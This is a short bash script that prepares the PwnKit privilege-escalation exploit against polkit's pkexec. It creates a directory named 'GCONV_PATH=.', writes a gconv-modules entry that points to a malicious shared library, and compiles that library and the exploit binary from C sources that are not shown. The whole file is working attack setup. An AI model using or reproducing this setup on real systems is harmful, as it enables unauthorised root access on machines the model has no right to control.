#!/bin/bash
mkdir 'GCONV_PATH=.'
touch 'GCONV_PATH=./pwnkitdir'
chmod 777 'GCONV_PATH=./pwnkitdir'
mkdir pwnkitdir
touch pwnkitdir/gconv-modules
echo "module UTF-8// PWNKIT// pwnkit 1" >> pwnkitdir/gconv-modules
gcc -fPIC -shared lib.c -o pwnkitdir/pwnkit.so
gcc exp.c -o exp